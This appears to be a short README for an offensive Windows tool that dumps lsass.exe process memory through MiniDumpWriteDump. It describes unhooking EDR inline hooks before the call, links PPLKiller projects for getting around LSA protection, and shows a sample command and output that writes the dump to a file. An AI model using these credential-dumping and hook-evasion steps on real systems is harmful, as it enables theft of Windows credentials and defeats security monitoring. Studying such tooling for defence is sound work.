# procdump

Dump full(type 0x02) process memory via `MiniDumpWriteDump`, most commonly be used to dump `lsass.exe` (Need `SeDebugPrivilege` for operating)

Will check if `dbgcore.dll!MiniDumpWriteDump` is inline hooked and try to unhook before invoking

P.s. If lsass.exe is protected by [PPL](https://www.scip.ch/en/?labs.20200116) (`PsProtectedTypeProtectedLight` type and `PsProtectedSignerLsa` signer), it's knotty, you can try [RedCursorSecurityConsulting/PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) or [Mattiwatti/PPLKiller](https://github.com/Mattiwatti/PPLKiller)

```
PS C:\> .\procdump.exe lsass.exe 1.bin
dbgcore.dll!MiniDumpWriteDump is not hooked
Dump lsass.exe to 1.bin
PS C:\> file 1.bin
1.bin: Mini DuMP crash report, 11 streams, Sat Aug  8 12:07:03 2020, 0x2 type
```

